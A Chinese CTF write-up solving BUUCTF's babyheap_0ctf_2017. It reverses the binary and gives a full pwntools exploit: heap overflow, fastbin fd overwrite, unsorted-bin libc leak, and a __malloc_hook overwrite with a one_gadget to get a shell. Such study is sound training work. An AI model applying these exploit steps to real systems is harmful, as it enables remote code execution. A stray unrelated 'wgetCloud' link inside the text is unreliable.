# 一、题目来源

BUUCTF-Pwn-babyheap\_0ctf\_2017

[![](https://img2024.cnblogs.com/blog/3622178/202509/3622178-20250924134752647-405701854.png)](https://img2024.cnblogs.com/blog/3622178/202509/3622178-20250924134752647-405701854.png)

# 二、信息搜集

将题目给的可执行文件丢入Linux虚拟机中

通过`file`命令查看文件类型：

[![image](https://img2024.cnblogs.com/blog/3622178/202509/3622178-20250924135220962-243318797.png)](https://img2024.cnblogs.com/blog/3622178/202509/3622178-20250924135220962-243318797.png)

通过`checksec`命令查看本题采用的保护机制：

[![image](https://img2024.cnblogs.com/blog/3622178/202509/3622178-20250924135308425-1395796537.png)](https://img2024.cnblogs.com/blog/3622178/202509/3622178-20250924135308425-1395796537.png)

> 注意：
> 我的Ubuntu版本与题目版本不一致，为了消除libc版本不同的干扰，于是我使用了pwninit
> 不清楚这个工具的可以上网搜搜，对解题思路的理解没有任何的影响

# 三、反汇编文件开始分析

将题目给的二进制文件丢入64位的Ida Pro中进行反汇编操作

看到汇编代码比较多，为了快速理解程序大致逻辑，我们通过

* 看C语言的方式来理解程序逻辑
* 边运行程序边看代码

首先看到main函数：

```
__int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
  __int64 v4; // [rsp+8h] [rbp-8h]

  v4 = sub_B70(a1, a2, a3);
  while ( 1 )
  {
    sub_CF4();
    sub_138C();
    switch ( (unsigned __int64)off_14F4 )
    {
      case 1uLL:
        sub_D48(v4);
        break;
      case 2uLL:
        sub_E7F(v4);
        break;
      case 3uLL:
        sub_F50(v4);
        break;
      case 4uLL:
        sub_1051(v4);
        break;
      case 5uLL:
        return 0LL;
      default:
        continue;
    }
  }
}
```

结合程序运行情况

[![image]()](undefined)

可以将上述反编译出来的C语言代码进行重命名操作：

```
__int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
  char *v4; // [rsp+8h] [rbp-8h]

  v4 = mmap_a_place_for_struct_of_heap();
  while ( 1 )
  {
    menu();
    input_longint();
    switch ( (unsigned __int64)off_14F4 )
    {
      case 1uLL:
        Allocate((__int64)v4);
        break;
      case 2uLL:
        Fill((__int64)v4);
        break;
      case 3uLL:
        Free((__int64)v4);
        break;
      case 4uLL:
        Dump((__int64)v4);
        break;
      case 5uLL:
        return 0LL;
      default:
        continue;
    }
  }
}
```

switch的几个分支非常好理解，就是和程序运行出来的几个选项是一一对应的

简单解释一下“menu”和“input\_longint”

* menu：点进该函数就能看到几个选项的输出，因此我将其重命名为menu（菜单）
* input\_longint：点进该函数，简单分析后就能看出该函数的作用就是一个一个地将输入缓冲区的输入读入某个指定位置，再将该输入进行atol转型成long int类型的数据，因此将其命名为input\_longint

既然有四个功能，我们就逐一进行分析

但是，在分析之前，需要注意到这四个函数都传入了一个参数v4

v4来源于一个函数`sub_B70(a1, a2, a3);`的返回值

我们点进去查看一下：

```
char *mmap_a_place_for_struct_of_heap()
{
  int fd; // [rsp+4h] [rbp-3Ch]
  char *addr; // [rsp+8h] [rbp-38h]
  __int64 v3; // [rsp+10h] [rbp-30h]
  unsigned __int64 buf; // [rsp+20h] [rbp-20h]
  unsigned __int64 v5; // [rsp+28h] [rbp-18h]
  unsigned __int64 v6; // [rsp+38h] [rbp-8h]

  v6 = __readfsqword(0x28u);
  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(_bss_start, 0LL, 2, 0LL);
  alarm(0x3Cu);
  puts("===== Baby Heap in 2017 =====");
  fd = open("/dev/urandom", 0);
  if ( fd < 0 || read(fd, &buf, 0x10uLL) != 16 )
    exit(-1);
  close(fd);
  addr = (char *)((buf
                 - 93824992161792LL * ((unsigned __int64)(0xC000000294000009LL * (unsigned __int128)buf >> 64) >> 46)
                 + 0x10000) & 0xFFFFFFFFFFFFF000LL);
  v3 = (v5 - 3712 * (0x8D3DCB08D3DCB0DLL * (unsigned __int128)(v5 >> 7) >> 64)) & 0xFFFFFFFFFFFFFFF0LL;
  if ( mmap(addr, 0x1000uLL, 3, 34, -1, 0LL) != addr )
    exit(-1);
  return &addr[v3];
}
```

可以看到一些很长很复杂的数字，但是我们只需要把握关键信息即可

我们要的是返回值，即`&addr[v3];`

`addr`又来自函数`mmap`，这函数相信大家再熟悉不过了，就是用于动态申请一片空间，且该函数还能设置对该空间的权限

参数`v3`的计算比较复杂，我们可以先继续分析下去，若不需要该参数那最好，如果需要我们再说

综上，这个函数就是开辟一片空间，也可以看到我将其命名为了“mmap\_a\_place\_for\_struct\_of\_heap”（当然这个命名目前来看有点超前了，大家不用在意）

接下来我们逐个分析这四个关键函数

## 1、Allocate

对应代码：

```
void __fastcall Allocate(__int64 a1)
{
  signed int i; // [rsp+10h] [rbp-10h]
  signed int v2; // [rsp+14h] [rbp-Ch]
  void *v3; // [rsp+18h] [rbp-8h]

  for ( i = 0; i <= 15; ++i )
  {
    if ( !*(_DWORD *)(24LL * i + a1) )
    {
      printf("Size: ");
      v2 = input_longint();
      if ( v2 > 0 )
      {
        if ( v2 > 4096 )
          v2 = 4096;
        v3 = calloc(v2, 1uLL);
        if ( !v3 )
          exit(-1);
        *(_DWORD *)(24LL * i + a1) = 1;
        *(_QWORD *)(a1 + 24LL * i + 8) = v2;
        *(_QWORD *)(a1 + 24LL * i + 16) = v3;
        printf("Allocate Index %d\n", (unsigned int)i);
      }
      return;
    }
  }
}
```

不难看出，本函数的功能就是通过for循环的方式，找到之前申请的空间（V4）中无数据的地方（`!*(_DWORD *)(24LL * i + a1)` ），接着动态申请（`calloc`）用户指定大小的空间（上限4096），若申请成功，则将刚刚找到的空白位置（`(_DWORD *)(24LL * i + a1)`）的第一个8字节处赋值为1，第二个8字节处赋值为本次通过`calloc`申请的chunk大小，第三个8字节赋值为该chunk的地址

[![image]()](undefined)

由此，我们可以分析出V4这片区域的作用：

* 专门用于存放动态申请的chunk的相关信息，信息共24字节
  + 0-7字节：是否申请chunk成功，成功为1；未申请时为0
  + 8-15字节：申请的chunk的大小，此大小不包含chunk header
  + 16-23字节：申请的chunk所在的地址
* 最多能存放16个chunk的信息（`i = 0; i <= 15; ++i`）
* 找空闲位置的依据是观察第一个字段（0-7）是否为0
* 位置的寻找是按照0-15这样的顺序找的（++i），且i会作为申请成功chunk的下标（index）

## 2、Fill

对应代码：

```
__int64 __fastcall Fill(__int64 a1)
{
  __int64 result; // rax
  int v2; // [rsp+18h] [rbp-8h]
  int v3; // [rsp+1Ch] [rbp-4h]

  printf("Index: ");
  result = input_longint();
  v2 = result;
  if ( (signed int)result >= 0 && (signed int)result <= 15 )
  {
    result = *(unsigned int *)(24LL * (signed int)result + a1);
    if ( (_DWORD)result == 1 )
    {
      printf("Size: ");
      result = input_longint();
      v3 = result;
      if ( (signed int)result > 0 )
      {
        printf("Content: ");
        result = sub_11B2(*(_QWORD *)(24LL * v2 + a1 + 16), v3);
      }
    }
  }
  return result;
}
```

有了之前的铺垫，就很好理解了

用户输入index，他就能定位到指定的chunk的相关信息（那24个字节），他会先判断那片区域是否有chunk的信息（`(_DWORD)result == 1`），然后再向用户要Size信息，该信息会作为`sub_11B2`函数的一个参数

那我们来看看函数sub\_11B2

```
unsigned __int64 __fastcall sub_11B2(__int64 a1, unsigned __int64 a2)
{
  unsigned __int64 v3; // [rsp+10h] [rbp-10h]
  ssize_t v4; // [rsp+18h] [rbp-8h]

  if ( !a2 )
    return 0LL;
  v3 = 0LL;
  while ( v3 < a2 )
  {
    v4 = read(0, (void *)(v3 + a1), a2 - v3);
    if ( v4 > 0 )
    {
      v3 += v4;
    }
    else if ( *_errno_location() != 11 && *_errno_location() != 4 )
    {
      return v3;
    }
  }
  return v3;
}
```

不难理解，这就是一个改版的`read`函数，输入的位置是`*(_QWORD *)(24LL * v2 + a1 + 16)`即chunk的user data部分，输入的长度是我们之前指定的大小（Size）

讲到这，大家应该已经看出来了，这里存在堆溢出啊！

目前还没看出具体的利用手段，先在这留个心眼

## 3、Free

对应代码：

```
__int64 __fastcall Free(__int64 a1)
{
  __int64 result; // rax
  int v2; // [rsp+1Ch] [rbp-4h]

  printf("Index: ");
  result = input_longint();
  v2 = result;
  if ( (signed int)result >= 0 && (signed int)result <= 15 )
  {
    result = *(unsigned int *)(24LL * (signed int)result + a1);
    if ( (_DWORD)result == 1 )
    {
      *(_DWORD *)(24LL * v2 + a1) = 0;
      *(_QWORD *)(24LL * v2 + a1 + 8) = 0LL;
      free(*(void **)(24LL * v2 + a1 + 16));
      result = 24LL * v2 + a1;
      *(_QWORD *)(result + 16) = 0LL;
    }
  }
  return result;
}
```

不难看出，就是拓展版的`free`操作，他将申请的chunk进行free操作，还将v4中的对应的数据进行初始化（0）操作

## 4、Dump

对应代码：

```
signed int __fastcall Dump(__int64 a1)
{
  signed int result; // eax
  signed int v2; // [rsp+1Ch] [rbp-4h]

  printf("Index: ");
  result = input_longint();
  v2 = result;
  if ( result >= 0 && result <= 15 )
  {
    result = *(_DWORD *)(24LL * result + a1);
    if ( result == 1 )
    {
      puts("Content: ");
      puts_content(*(_QWORD *)(24LL * v2 + a1 + 16), *(_QWORD *)(24LL * v2 + a1 + 8));
      result = puts(byte_14F1);
    }
  }
  return result;
}
```

不难看出，就是将chunk的user data部分进行输出

# 四、利用思路分析

我们将关键点进行列举：

* 存在堆溢出
* 存在读内容（读再衍生一下就是泄露）
* 保护措施全开

不难发现，本题的关键就是能否泄露出信息

想一下堆利用中能泄露信息的，第一反应就是Unsorted Bin Leak

而Unsorted Bin Leak能实现的关键就在：

* 是否存在两个及以上的指针指向同一个chunk
* 是否存在chunk的fd、bk指针信息读取的方式

很明显:

* 虽然不能Double Free（因为`free`函数之前存在检查（前8字节部分的值是否为1）），但是由于本题存在堆溢出，基本可以玩转Fast Bin里面的攻击手段，因此，可以通过伪造Fast Bin序列（将未被free的目标chunk放入bin序列，接着再申请chunk，即完成双指）来实现chunk的双指
  -Dump函数完美满足第二个条件

既然能实现Unsorted Bin Leak，即能完成libc基址的泄露

我们上面提到过“玩转Fast Bin里面的攻击手段”，很容易想到House Of Spirit，即任意写

got劫持被ban了（Full RELRO），那么劫持\_\_malloc\_hook成onegadget就好了

# 五、Poc构造

有了思路，我们就可以开始构造Poc了

首先，我们先确定chunk的数目：

* House Of Spirit等Fast Bin利用都需要使Fast Bin中至少有两个chunk(chunk1,chunk2)
* 本题的双指需要在Fast Bin中有两个chunk的前提下，再要一个未被free的chunk(chunk4)
* 为了使得堆溢出更加灵活实用，我们在第一条提到的两个chunk前再加一个chunk(chunk0)，再第二条提到的一个chunk前再加一个chunk(chunk3)

[![]()](undefined)

## 1、四个功能的实现

利用离不开程序中的四个功能，因此先用python将这些功能封装成函数，方便后续的使用

```
from pwn import *

exe = ELF("./pwn_patched")
libc = ELF("./libc-2.23.so")
ld = ELF("./ld-2.23.so")

context.binary = exe
context(arch="amd64",os="linux",log_level="debug")


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("node5.buuoj.cn",26330)

    return r

def allocate(p,size):
    p.sendlineafter(b'Command: ',b"1")
    p.sendlineafter(b'Size: ',str(size))

# 输入的内容（content）部分需要是字节类型
def fill(p,index,content):
    p.sendlineafter(b'Command: ',b"2")
    p.sendlineafter(b'Index: ',str(index))
    p.sendlineafter(b'Size: ',str(len(content)))
    p.sendlineafter(b'Content: ',content)

def free(p,index):
    p.sendlineafter(b'Command: ',b"3")
    p.sendlineafter(b'Index: ',str(index))

def dump(p,index):
    p.sendlineafter(b'Command: ',b"4")
    p.sendlineafter(b'Index: ',str(index))

def main():
    p = conn()

    p.interactive()

if __name__ == "__main__":
    main()
```

## 2、5个chunk的申请

```
allocate(p,0x10) # chunk 0
allocate(p,0x10) # chunk 1
allocate(p,0x10) # chunk 2
allocate(p,0x10) # chunk 3
allocate(p,0x80) # chunk 4
```

关于大小的选择：

* chunk0、3仅用于堆溢出，大小其实无所谓，只是尽量对齐
* chunk1、2需要放入Fast Bin，不能过大，也尽量满足对齐
* chunk4，最终需要放入unsorted bin，需要满足“释放（free）的chunk大小不属于fast bin，并且该chunk不和top chunk紧邻”，先满足前半句（64位Fast Bin中能存放的默认最大值为(64 \* SIZE\_SZ / 4) = (64 \* 8 / 4) = 128B = 0x80，但是我们是申请0x80，也就意味着size的大小为0x90>0x80即不满足Fast Bin），后半句后续再处理

## 3、free chunk1、2

根据思路，为了实现双指，我们需要让两个chunk先进入Fast Bin

```
free(p,1)
free(p,2)
```

此时我们可以动态调试一下，看一下实际情况是否符合我们的预期，调试代码：

```
#!/usr/bin/env python3

from pwn import *

exe = ELF("./pwn_patched")
libc = ELF("./libc-2.23.so")
ld = ELF("./ld-2.23.so")

context.binary = exe
context(arch="amd64",os="linux",log_level="debug")


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("node5.buuoj.cn",26330)

    return r

def allocate(p,size):
    p.sendlineafter(b'Command: ',b"1")
    p.sendlineafter(b'Size: ',str(size))

# 输入的内容（content）部分需要是字节类型
def fill(p,index,content):
    p.sendlineafter(b'Command: ',b"2")
    p.sendlineafter(b'Index: ',str(index))
    p.sendlineafter(b'Size: ',str(len(content)))
    p.sendlineafter(b'Content: ',content)

def free(p,index):
    p.sendlineafter(b'Command: ',b"3")
    p.sendlineafter(b'Index: ',str(index))

def dump(p,index):
    p.sendlineafter(b'Command: ',b"4")
    p.sendlineafter(b'Index: ',str(index))

def main():
    p = conn()

    gdb_script = f'''
    '''

    allocate(p,0x10) # chunk 0 
    allocate(p,0x10) # chunk 1
    allocate(p,0x10) # chunk 2
    allocate(p,0x10) # chunk 3
    allocate(p,0x80) # chunk 4

    free(p,1)
    free(p,2)

    gdb.attach(p,gdbscript = gdb_script)
    pause()

    p.interactive()


if __name__ == "__main__":
    main()
```

运行，在新出来的gdb终端输入命令：

```
heap
```

[![]()](undefined)

正如我们分析的一样，fastbin中已经有两个chunk了，且根据fd指针能知道该单链表的情况如下：

[![image]()](undefined)

## 4、通过堆溢出修改fd指针

先保持上面的动态调试不退出，我们先来看看溢出需要填充什么数据

我们设计的是chunk0用于溢出，那么就从chunk0开始看

[![]()](undefined)

很明显：

* 写入位置在0x6042af3ac010
* 需要被覆盖的fd指针在0x6042af3ac050

我们在覆盖的同时，尽量不要动不需要动的信息

换言之就是尽量保持原样

因此，我们的payload就是：

```
payload = p64(0)*3
payload += p64(0x21)
payload += p64(0)*3
payload += p64(0x21)
payload += p8(0x80)
fill(p,0,payload)
```

解释一下最后的`p8(0x80)`

在内存中的十六进制数是按照小端序（本题信息搜集的时候，知道本题是小段序（little））进行排列的，换言之，我们要覆盖的fd部分在覆盖前内存中的样子是：

```
\x20\xc0……\x60\x00\x00
```

而我们的目的，是将链条链接到chunk4上，即只需要修改最低有效位（0x20）成0x80（因为chunk4的地址0x6042af3ac080），也就是修改最低地址的一字节的数据就好了，因此使用的是`p8(0x80)`

检查一下是否和我们想的一样，老方法，动态调试

只要把

```
gdb.attach(p,gdbscript = gdb_script)
    pause()
```

挪到新输入的内容后面即可（后面不再提本步骤！）

[![]()](undefined)

发现的确如此，此时Fast Bin中变成了：

[![image]()](undefined)

此时chunk4虽然没有被free，但已经存在于bin中，若此时在此申请chunk，根据程序Allocate的功能，又会出现一个指向chunk4的结构，也就是完成了双指

## 5、再次动态申请chunk4

在申请之前，有两个问题：

* Fast Bin符合LIFO，即后进先出，那么先出的就是chunk2而非chunk4，因此我们需要Allocate两次
* malloc的检查

malloc的检查什么意思呢？

我们知道，在Fast Bins中，每个Fast Bin里面的chunk的大小都是一致的

换言之，原先chunk1的size大小是0x21（1是三位flag，不会计入实际大小，因此该chunk的大小为0x20），那么chunk1就会被存储在chunk大小都为0x20的Fast bin中

那当我们再次malloc一个0x10大小的chunk的时候（malloc指定的大小是不含chunk header的（占0x10）），就会去chunk大小都为0x20的Fast bin中去查找，但是此时找到一个大小为0x90的chunk，malloc就会检查出异常，因而程序终止

因此，我们在申请之前，再通过堆溢出（这次通过chunk3来，因为近），修改chunk4的size字段，将其修改为0x21，从而绕过判断

代码如下：

```
payload = p64(0)*3
    payload += p8(0x21)
    fill(p,3,payload)

    allocate(p,0x10) # index1指向chunk2
    allocate(p,0x10) # index2指向chunk4，由于chunk4并非常规free，还有原本的index4也指向chunk4
```

此时就实现了双指

[![image]()](undefined)

同样，动态调试验证一下：

这里有个问题，就是我们之前提到的开辟的空白空间v4是不确定位置的

但是若要看到双指，就需要去v4空间才能看到

我们同样在动态调试界面，查看一下虚拟内存映射

[![image]()](undefined)

我们知道，通过mmap动态申请的内存具有特点：

* 大小0x1000字节（`mmap(addr, 0x1000uLL……`）
* 该空间不会被内核标记为heap，而是会与现有内存空间“粘”在一起

因此，我们运行两次动态调试代码，并都使用`vmmap`命令查看内存映射空间

[![image]()](undefined)

发现有明显变化的在上面部分，我们可以一点一点地查看

直到发现：

[![]()](undefined)

1不就是标记吗？0x10不就是大小吗？

没错，这里就是存放chunk信息的地方

而且可以看到，index2和index4所对应的chunk是同一个，都是chunk4

[![image]()](undefined)

## 6、free chunk4 to Unsorted Bin

接下来就是泄露的预处理部分了，即先让chunk4进入Unsorted Bin

之前也提到过，要让其进入Unsorted Bin需要满足两个条件：

* 释放（free）的chunk大小不属于fast bin的范围
* 该chunk不和top chunk紧邻时

关于第一条，我们只需要将其大小改回去（0x21 -> 0x91），然后free即可

关于第二条，由于chunk4是最晚申请的，他就挨着top chunk，我们也可以通过动态调试来验证这一点

[![image]()](undefined)

很明显，0x……090 + 0x90 = 0x……110，他们就是挨着的

为了满足条件二，我们可以再申请一个chunk5，让chunk4与top chunk分开

于是payload：

```
# 大小改回去
    payload = p64(0) * 3
    payload += p64(0x91)
    fill(p,3,payload)

    '''
    由于chunk4接近top chunk
    为了能让其顺利进入unsorted bin，先申请一个chunk5，让chunk4与top chunk分开
    '''
    allocate(p,0x80)

    # chunk4被放入unsorted bin
    free(p,4)
```

动态调试看看效果：

[![image]()](undefined):[wgetCloud](https://wgetcloud6.org)

chunk4成功进入unsortedbin，且出现特征：“如果usorted bin中只有一个bin ，那么它的fd和bk指针会指向同一个地址，就是unsorted bin链表的头部”

## 7、libc基址的计算

计算libc基址，我们需要知道以下知识点：

* “`small bins`, `large bins`, `unsorted bin`统一存放在`malloc_state`这个结构体中的一个数组中”
* `malloc_state`是属于`main_arena`的
* `main_arena`是一个全局变量，位于`libc`的数据段

因此，如果我们知道上述情况中的fd指针/bk指针所指向的地址，那我们也就相当于知道了main\_arena的基址（根据固定的偏移量），也就是知道了libc的基址（根据固定的偏移量）

[![]()](undefined)

很明显，接下来我们要做的就是偏移量的确定

### （1）泄露的fd所指向的地址与main\_arena的偏移量

之前动态调试我们知道了fd指向的地址是0x751a6fd8eb78

通过命令：

```
x/gx 0x751a6fd8eb78
```

[![image]()](undefined)

可以看到，虽然我们使用的是查看内存中存储的数据的命令，但是在显示结果的同时，pwndbg插件还自动帮我们计算出来了该地址（我们访问的内存地址）与main\_arena基址之间的差值

差值为88B即0x58B

### （2）main\_arena与libc基址的偏移量

pwntools提供了边界的方法：

```
from pwn import *
main_arena_offset = libc.symbols['main_arena']
```

### （3）本步骤的payload

```
offset_unsortedbin = 0x58
offset_main_arena = libc.symbols['main_arena']

dump(p,2) # 泄露fd的值，这也是双指的最终目的

p.recvline(2)

leak_bin1 = u64(p.recv(8)) # 接收泄露数据

print(hex(leak_bin1))

libc_base = leak_bin1 - offset_unsortedbin - offset_main_arena

print(f'leaked_libc_base : {hex(int(libc_base))}')
```

我们此时直接运行Poc，看一下效果：

[![image]()](undefined)

可以看到libc的地址计算出来了，并且是一个页对齐的地址，很符合一个libc基址的样子

## 8、\_\_malloc\_hook

目标：修改\_\_malloc\_hook为one\_gadget的地址
手段：House Of Spirit

因此，我们需要再次在Fast Bin中放入chunk，然后修改fd指针完成链接的重定向

关键点来了，我们上面讲过：

* 同一链接下的chunk的大小相同
* malloc会检查bin中的数据大小

我们最终的目的是在\_\_malloc\_hook附近创建chunk然后写入数据，实现任意地址写入

而实现任意地址写入的方法就是修改链条的指向（指向\_\_malloc\_hook附近的那块地址，作为伪chunk）

因此，我们需要通过\_\_malloc\_hook附近的伪size字段的大小来决定我们需要申请的chunk的大小是多少

> 这里很绕，大家可以多理解理解
> 是在理解不了的可以看看最终的Poc组成，想想“为什么这么做？”这个问题

通过动态调试观察\_\_malloc\_hook附近是否有作为伪chunk的好地方

[![image]()](undefined)

发现有连续的8字节可以作为我们的伪chunk的size，精确定位一下：

[![image]()](undefined)

红线划着的地址就是伪chunk的地址，伪size就是0x7a了

> 注意，伪size的大小可能会变化，大家根据自己的实际情况来

但是本题是有ALSR、PIE的，因此该地址最好与泄露出来的libc地址进行联系，即算差值

`vmmap`查看内存映射

[![image]()](undefined)

确定libc基址是0x7a01d628a000

计算差值：

[![image]()](undefined)

差值就是0x3c4aed

此时，我们也可以确定要放入fastbin中chunk的大小了，就是0x70（即`Allocate(0x60)`）

> 为什么0x70就可以呢，0x70也不等于0x7a啊？
> 因为malloc检查的是大致的范围并不是精确范围

于是，我们可以构造payload：

```
# chunk入fastbin
    allocate(p,0x60)
    free(p,4)

    # 修改fd指针，这里不需要用到堆溢出来修改，因为我们已经完成了双指，index2还指着呢
    payload = p64(libc_base+0x3c4aed)
    fill(p,2,payload)

    # 申请伪chunk
    allocate(p,0x60)
    allocate(p,0x60)

    # 在伪chunk中写入数据
    payload = p8(0)*3
    payload += p64(0)*2
    payload += p64(libc_base+0x4526a) # one_gadget的地址
    fill(p,6,payload)
```

补充一下伪chunk写入数据的部分的相关分析：

我们写入数据的地方在0x7a01d664eafd

[![image]()](undefined)

\_\_malloc\_hook的地方在：0x7a01d664eb10

[![image]()](undefined)

他们之间的差值为：0x13，即19

[![image]()](undefined)

那么我们的padding就是0x13，即对应payload：

```
payload = p8(0)*3
    payload += p64(0)*2
```

接着就是写入one\_gadget的地址到\_\_malloc\_hook的位子了，对应：

```
payload += p64(libc_base+0x4526a) # one_gadget的地址
```

one\_gadget的寻找:

[![image]()](undefined)

尝试几个后，还是libc\_base+0x4526a这个one\_gadget靠谱

## 9、getshell

再次调用malloc

```
allocate(p,255)
```

就会执行one\_gadget，即getshell

## 10、完整的Poc

```
#!/usr/bin/env python3

from pwn import *

exe = ELF("./pwn_patched")
libc = ELF("./libc-2.23.so")
ld = ELF("./ld-2.23.so")

context.binary = exe
context(arch="amd64",os="linux",log_level="debug")


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("node5.buuoj.cn",26330)

    return r

def allocate(p,size):
    p.sendlineafter(b'Command: ',b"1")
    p.sendlineafter(b'Size: ',str(size))

# 输入的内容（content）部分需要是字节类型
def fill(p,index,content):
    p.sendlineafter(b'Command: ',b"2")
    p.sendlineafter(b'Index: ',str(index))
    p.sendlineafter(b'Size: ',str(len(content)))
    p.sendlineafter(b'Content: ',content)

def free(p,index):
    p.sendlineafter(b'Command: ',b"3")
    p.sendlineafter(b'Index: ',str(index))

def dump(p,index):
    p.sendlineafter(b'Command: ',b"4")
    p.sendlineafter(b'Index: ',str(index))

def main():
    p = conn()

    gdb_script = f'''
    '''

    allocate(p,0x10) # chunk 0 
    allocate(p,0x10) # chunk 1
    allocate(p,0x10) # chunk 2
    allocate(p,0x10) # chunk 3
    allocate(p,0x80) # chunk 4

    free(p,1)
    free(p,2)

    payload = p64(0)*3
    payload += p64(0x21)
    payload += p64(0)*3
    payload += p64(0x21)
    payload += p8(0x80)
    fill(p,0,payload)

    payload = p64(0)*3
    payload += p8(0x21)
    fill(p,3,payload)

    allocate(p,0x10) # index1指向chunk2
    allocate(p,0x10) # index2指向chunk4，由于chunk4并非常规free，还有原本的index4也指向chunk4

    # 改回chunk4的大小，为了其能被放入unsorted bin
    payload = p64(0) * 3
    payload += p64(0x91)
    fill(p,3,payload)

    ''' 
    由于chunk4接近top chunk
    为了能让其顺利进入unsorted bin（根据定义：该`chunk`不和`top chunk`紧邻时，
    该`chunk`会被首先放到unsorted bin中），先申请一个chunk5，让chunk4与top chunk分开
    '''
    allocate(p,0x80)

    # chunk4被放入unsorted bin
    free(p,4)

    offset_unsortedbin = 0x58
    offset_main_arena = libc.symbols['main_arena']

    dump(p,2)

    p.recvline(2)

    leak_bin1 = u64(p.recv(8))

    print(hex(leak_bin1))

    libc_base = leak_bin1 - offset_unsortedbin - offset_main_arena

    print(f'leaked_libc_base : {hex(int(libc_base))}')

    allocate(p,0x60)
    free(p,4)

    # gdb.attach(p,gdbscript = gdb_script)
    # pause()

    payload = p64(libc_base+0x3c4aed)
    fill(p,2,payload)
    allocate(p,0x60)
    allocate(p,0x60)

    payload = p8(0)*3
    payload += p64(0)*2
    payload += p64(libc_base+0x4526a)
    fill(p,6,payload)

    allocate(p,255)

    p.interactive()


if __name__ == "__main__":
    main()
```

本地测试：

[![image]()](undefined)

成功拿下本地shell

远程测试：

[![image]()](undefined)

成功拿下flag！

# 六、本题学习资料推荐

本题涉及到的知识点很多

而且如果大家是顺着刷BUUCTF-Pwn题目的，这个应该是大家遇到的第一个堆类型的Pwn

从栈到堆是一个很大的跨越，需要学习堆的相关知识（比如数据结构）

没有基础知识的支撑是做不出这题的，所以推荐大家先去ctf-wiki上学习一下堆的基础知识

再结合本文章来pwn掉这道题！

> 记住，慢慢来，你终会理解并解决这道题的！

\_\_EOF\_\_

![](https://github.com/youdiscovered1t/p/19109746.html)YouDiscovered1t 本文链接：[https://github.com/youdiscovered1t/p/19109746.html](https://github.com)关于博主：评论和私信会在第一时间回复。或者[直接私信](https://github.com)我。版权声明：本博客所有文章除特别声明外，均采用 [BY-NC-SA](https://github.com "BY-NC-SA") 许可协议。转载请注明出处！声援博主：如果您觉得文章对您有帮助，可以点击文章右下角**【[推荐](javascript:void(0);)】**一下。您的鼓励是博主的最大动力！
